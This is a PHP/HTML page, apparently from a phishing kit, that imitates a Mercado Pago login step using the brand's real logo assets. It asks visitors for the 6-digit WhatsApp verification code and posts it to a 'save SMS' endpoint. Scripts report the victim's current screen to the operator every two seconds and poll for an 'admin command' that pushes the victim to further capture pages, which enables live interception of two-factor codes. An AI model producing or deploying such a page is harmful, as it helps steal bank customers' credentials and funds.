<?php
session_start();

// Recupera os dados da sessão para exibição dinâmica.
$identificador_cliente = $_SESSION['identificador_usuario'] ?? '123.123.123-12'; // Valor de exemplo
$tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF'; // Valor de exemplo

function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// Define o alvo do redirecionamento com base no dispositivo
if (isMobileDevice()) {
    $redirect_target_2fa = 'dois_fatores.php';
} else {
    $redirect_target_2fa = 'dois_fatores.php';
}

// Função para formatar o CPF
function formatarCPF($cpf) {
    $cpfLimpio = preg_replace('/[^0-9]/', '', $cpf);
    if (strlen($cpfLimpio) != 11) { return $cpf; }
    return substr($cpfLimpio, 0, 3) . '.' . substr($cpfLimpio, 3, 3) . '.' . substr($cpfLimpio, 6, 3) . '-' . substr($cpfLimpio, 9, 2);
}

// Formata o dado apenas se o tipo for 'CPF'
$dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_cliente) : $identificador_cliente;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insira o código que te enviamos por WhatsApp</title>
    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/6.6.5/mercadolibre/favicon.ico" type="image/svg"/>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-borda: #ccc;
            --cor-fundo: #f5f5f5;
            --cor-card: #fff;
            --cor-linha: #e0e0e0;
            /* Adicionadas cores para o pop-up */
            --cor-sucesso: #28a745;
            --cor-erro: #dc3545;
        }
        html { height: 100%; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: var(--cor-texto-primaria); display: flex; flex-direction: column; min-height: 100%; }
        .main-header { background-color: var(--cor-amarela); padding: 12px 24px; flex-shrink: 0; }
        .main-header img { height: 30px; }
        .main-content { background-color: var(--cor-card); padding: 24px; flex-grow: 1; }
        .user-info-box { display: flex; align-items: center; gap: 8px; border: 1px solid var(--cor-linha); border-radius: 30px; padding: 6px 12px; margin-bottom: 32px; font-size: 14px; width: fit-content; }
        .user-info-box .icon { width: 24px; height: 24px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .user-info-box .icon svg { width: 16px; height: 16px; }
        .user-info-box a { font-size: 12px; color: var(--cor-azul); text-decoration: none; margin-left: 8px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; margin-bottom: 8px; text-align: left; }
        .main-title { font-size: 24px; font-weight: 500; margin: 0 0 12px 0; text-align: left; }
        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin: 0 0 32px 0; text-align: left; }
        .code-inputs { display: flex; gap: 8px; justify-content: space-between; margin: 16px 0; }
        .code-inputs input { width: 100%; max-width: 45px; height: 55px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; flex-grow: 1; }
        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
        .btn { padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; border: none; width: 100%; box-sizing: border-box; margin-top: 16px; }
        .btn-primary { background-color: var(--cor-azul); color: white; }
        .resend-timer { text-align: center; font-size: 14px; color: var(--cor-texto-secundaria); min-height: 21px; margin-top: 24px; }
        .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
        .footer-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; margin-top: 24px; display: block; text-align: center; }
        .main-footer { background-color: var(--cor-card); padding: 24px; text-align: center; border-top: 1px solid var(--cor-linha); flex-shrink: 0; }
        .main-footer a { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }

        /* PASSO 1: CSS PARA O POP-UP CUSTOMIZADO */
        .toast {
            position: fixed;
            top: -100px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            border-radius: 6px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 1000;
            transition: top 0.5s ease-in-out;
        }
        .toast.show {
            top: 20px;
        }
        .toast.success {
            background-color: var(--cor-sucesso);
        }
        .toast.error {
            background-color: var(--cor-erro);
        }
    </style>
</head>
<body>

    <div id="notification-toast" class="toast"></div>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/pt_logo_large_plus.webp" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="user-info-box">
            <div class="icon">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
            </div>
            <span><?php echo htmlspecialchars($tipo_identificador) . ': ' . htmlspecialchars($dado_formatado); ?></span>
            <a href="index.php">Trocar conta</a>
        </div>

        <span class="session-start-label">INÍCIO DE SESSÃO</span>
        <h1 class="main-title">Insira o código que te enviamos por WhatsApp</h1>
        <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>

        <form id="sms-form" onsubmit="handleFormSubmit(event)">
            <div class="code-inputs">
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="tel" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>
            <button type="submit" class="btn btn-primary">Confirmar código</button>
        </form>

        <div class="resend-timer"></div>
        <a href="senha-mobile.php" class="footer-link">Escolher outro método</a>
    </main>

    <footer class="main-footer">
        <a href="#">Preciso de ajuda</a>
    </footer>

    <script>
        // PASSO 3: LÓGICA JAVASCRIPT PARA CONTROLAR O POP-UP
        const toastElement = document.getElementById('notification-toast');
        let toastTimeout;

        function showToast(message, type = 'success') {
            clearTimeout(toastTimeout);
            toastElement.textContent = message;
            toastElement.className = 'toast';
            toastElement.classList.add(type);
            toastElement.classList.add('show');
            toastTimeout = setTimeout(() => {
                toastElement.classList.remove('show');
            }, 3000);
        }

        const smsForm = document.getElementById('sms-form');
        const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
        const timerElement = document.querySelector('.resend-timer');
        let countdownInterval;

        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function startTimer() {
            let seconds = 50;
            timerElement.style.color = 'var(--cor-texto-secundaria)';
            function updateTimer() {
                const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                const secs = String(seconds % 60).padStart(2, '0');
                timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
                if (seconds > 0) {
                    seconds--;
                } else {
                    clearInterval(countdownInterval);
                    timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                }
            }
            clearInterval(countdownInterval);
            updateTimer();
            countdownInterval = setInterval(updateTimer, 1000);
        }

        function resendSms(event) {
            event.preventDefault();
            // SUBSTITUIÇÃO DO ALERT
            showToast('Um novo código foi enviado!', 'success');
            startTimer();
        }

        document.addEventListener('DOMContentLoaded', startTimer);

        async function handleFormSubmit(event) {
            event.preventDefault();
            const code = inputs.map(input => input.value).join('');
            if (code.length === 6) {
                try {
                    const response = await fetch('api_salvar_sms.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sms_code: code, source: 'whatsapp' })
                    });
                    const result = await response.json();
                    if (result.success) {
                        // SUBSTITUIÇÃO DO ALERT
                        showToast('Código recebido com sucesso!', 'success');
                    } else {
                        // SUBSTITUIÇÃO DO ALERT
                        showToast('Erro: ' + (result.error || 'Não foi possível salvar o código.'), 'error');
                    }
                } catch (error) {
                    // SUBSTITUIÇÃO DO ALERT
                    showToast('Erro de conexão com o servidor.', 'error');
                    console.error('Fetch error:', error);
                }
            } else {
                // SUBSTITUIÇÃO DO ALERT
                showToast('Por favor, preencha todos os 6 dígitos.', 'error');
            }
        }
    </script>
    <script>
        (function() {
            const statusMap = { 'index.php': '...', 'login-mobile.php': '...', 'senha.php': '...', 'senha-mobile.php': '...', 'dois_fatores.php': '...', 'dois_fatores2.php': '...', 'doisfatores2mobile.php': '...', 'sms_desktop.php': '...', 'sms_mobile.php': '...', 'sms_whats_desktop.php': '...', 'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)', 'qrcode-mobile.php': '...', 'telaqr.php': '...', 'email2fadesktop.php': '...', 'email2famobile.php': '...', 'emailsms_desktop.php': '...', 'emailsms_mobile.php': '...', 'sms2fadesktop.php': '...', 'sms2famobile.php': '...', 'whats2fadesktop.php': '...', 'whats2framobile.php': '...' };
            const currentPage = window.location.pathname.split('/').pop();
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: currentStatus })
                    });
                } catch (error) {
                    console.error('Falha ao enviar atualização de status:', error);
                }
            }
            sendStatusUpdate();
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
    <script>
        (function() {
            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
            async function checkAdminCommand() {
                try {
                    const response = await fetch('api_check_status.php');
                    const data = await response.json();
                    if (data.status === 'redirecionar_para_2fa') {
                        clearInterval(statusInterval);
                        window.location.href = redirectUrl;
                    }
                } catch (error) {
                    console.error('Erro ao verificar status:', error);
                }
            }
            const statusInterval = setInterval(checkAdminCommand, 3000);
        })();
    </script>
</body>
</html>